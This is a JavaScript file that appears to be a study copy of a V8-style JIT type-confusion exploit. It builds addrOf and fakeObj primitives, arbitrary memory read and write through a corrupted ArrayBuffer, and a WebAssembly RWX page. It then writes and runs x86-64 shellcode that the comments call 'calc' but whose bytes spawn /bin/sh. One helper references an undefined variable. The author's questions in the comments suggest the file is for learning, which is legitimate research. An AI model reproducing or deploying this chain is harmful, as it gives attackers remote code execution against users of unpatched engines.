const LOOP_COUNT = 10000;

function makeObj(pValues) {
    // Create one inline property for triggering the CheckMaps operation
    let obj = { inline: 1234 };

    // Create 32 out-of-line properties for finding the overlapping backing store
    for (let i = 1; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, { writable: true, value: pValues[i] });
    }

    return obj;
}

let p1, p2;

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 1; i < 32; i++) {
        pNames[i] = 'p' + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access inline property of obj, forcing a CheckMap operation
      obj.inline;

      // Force a Map Transition via our side-effect
      this.Object.create(obj);

      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `);

    // Create an array of negative values from -1 to -32 to be used
    // for out makeObj function
    let pValues = [];
    for (let i = 1; i < 32; i++) {
        pValues[i] = -i;
    }

    // Trigger the vuln function to find the overlapping properties
    for (let i = 0; i < LOOP_COUNT; i++) {
        let obj = makeObj(pValues); // Create an object with 32 properties, all with empty objects
        let res = vuln(obj);
        for (let i = 1; i < res.length; i++) {
            // If i is not the same value with -res[i] (we do not count the initial array before Map transition), and res[i] is between -32 and 0, it overlaps
            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
                [p1, p2] = [i, -res[i]];
                return obj;
            }
        }
    }
    throw "[!] Failed to find overlapping properties";
}

// Conversion Buffers
let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
    floatView[0] = this;
    return uint64View[0];
};
BigInt.prototype.toNumber = function toNumber() {
    uint64View[0] = this;
    return floatView[0];
};

function addrOf(object) {
    eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    return obj.p${p1}.x1;
  }
  `);

    let pValues = [];
    pValues[p1] = { x1: 13.37, x2: 13.38 }; // accessed as float
    pValues[p2] = { y: object };            // accessed as JSObject and will be accessed as float <-- QUESTION: still not get why we need to use a different map

    // Use loop for triggering the compiler
    for (let i = 0; i < 10000; i++) {
        let obj = makeObj(pValues);
        let res = vuln(obj);
        if (res != 13.37) {
            // %DebugPrint(object);

            return res.toBigInt() - 1n; // subtract 1n from address due to pointer tagging.
        }
    }
    throw "[!] AddrOf Primitive Failed"
}

function fakeObj(object, value) {
    eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    let orig = obj.p${p1}.x2;
    obj.p${p1}.x2 = ${value.toNumber()};  // we assign the second property (the backing storage) to whatever we want
                                          // also, we need to transfer it into float as p1.x2 expects a float value
    return orig;
  }
`);

    let pValues = [];
    let objWithInlineProperties = { x1: 13.37, x2: 13.38 }
    pValues[p1] = objWithInlineProperties;   // the second property will point to the backing storage of the ArrayBuffer
    pValues[p2] = object;                    // directly pass the ArrayBuffer object for leaking the backing storage address

    for (let i = 0; i < 10000; i++) {
        objWithInlineProperties.x2 = 13.38; // force CheckMaps and Redundancy Elimination <-- QUESTION: why?

        let obj = makeObj(pValues);
        let res = vuln(obj);
        if (res != 13.38) {
            return res.toBigInt();
        }
    }
}

function exploit() {
    print("[+] Finding Overlapping Properties");
    findOverlappingProperties();
    print(`[+] Properties p${p1} and p${p2} overlap!`);

    // Flow:
    // 1. Leak address of the second buffer
    // 2. Overwrite backing storage of the first buffer with leaked address
    // 3. Get backing storage of the second buffer at index 4 of the first buffer
    // 4. Write data to the backing storage of 2nd buffer, which points to an arbitrary address

    let arrBuff1 = new ArrayBuffer(1024);
    let arrBuff2 = new ArrayBuffer(1024);

    print("[+] Leaking ArrayBuffer 2 address...");
    let arrBuff2Address = addrOf(arrBuff2);
    print(`[+] ArrayBuffer 2 address: 0x${arrBuff2Address.toString(16)}`);

    print("[+] Corrupting ArrayBuffer 1 backing storage address ...");
    // Overwrite Backign Store Pointer with address of the second buffer
    let originalArrBuff1BackingStore = fakeObj(arrBuff1, arrBuff2Address);
    print(`[+] Original ArrayBuffer 1 backing store: 0x${originalArrBuff1BackingStore.toString(16)}`);

    // Get the backing storage address of the second buffer
    let view1 = new BigUint64Array(arrBuff1); // use BigUint64Array to get byte representation of the data
    let originalArrBuff2BackingStore = view1[4];
    print(`[+] Original ArrayBuffer 2 backing store: 0x${originalArrBuff2BackingStore.toString(16)}`);

    // Read and write to arbitrary memory by using the backing storage of 
    let memory = {
        write(addr, bytes) {
            view1[4] = addr;
            let view2 = new Uint8Array(arrBuff2);
            view2.set(bytes);
        },
        read64(addr) {
            view1[4] = addr;
            let view2 = new BigUint64Array(arrBuff2);
            return view2[0];
        },
        write64(addr, ptr) {
            view1[4] = addr;
            let view2 = new BigUint64Array(arrBuff2);
            view2[0] = ptr;
        },
        addrOf(obj) {
            // Set object address to new out-of-line property called leakme
            arrBuff2.leakMe = obj;
            // Use `read64` primitive to leak the memory address of `properties` of our array buffer.
            let props = this.read64(arrBuf2Addr + 8n) - 1n;
            // Read offset 16 from the memory address of `properties` and return the address of our object.
            return this.read64(props + 16n) - 1n;
        }
    };
    print("[+] Constructed Memory Read and Write Primitive!");

    // Write data to 2nd buffer
    memory.write64(originalArrBuff2BackingStore, 0x13371337n);
    let readData = memory.read64(originalArrBuff2BackingStore);
    print(`[+] Read data from 2nd buffer: 0x${readData.toString(16)}`); // use GDB to validate

    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main; // point to the main function

    // Leak WasmInstance Address
    let wasmInstanceAddress = addrOf(wasmInstance);
    print(`[+] WASM Instance address: 0x${wasmInstanceAddress.toString(16)}`);

    // Leak RWX Memory Address
    let offset = 0xf0n;
    let wasmRWXAddress = memory.read64(wasmInstanceAddress + offset);
    print(`[+] RWX Memory address: 0x${wasmRWXAddress.toString(16)}`);

    print("[+] Preparing Shellcode...");
    // Prepare Calc Shellcode
    let shellcode = new Uint8Array([
        0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05
    ]);

    print("[+] Writing Shellcode to Jump Table Address...");
    // Write Shellcode to Jump Table Start Address
    memory.write(wasmRWXAddress, shellcode);

    // Execute our Shellcode
    print("[+] Popping Calc...");
    % DebugPrint(wasmInstance);
    func();
    // return func;
}


// let func = exploit();
exploit();

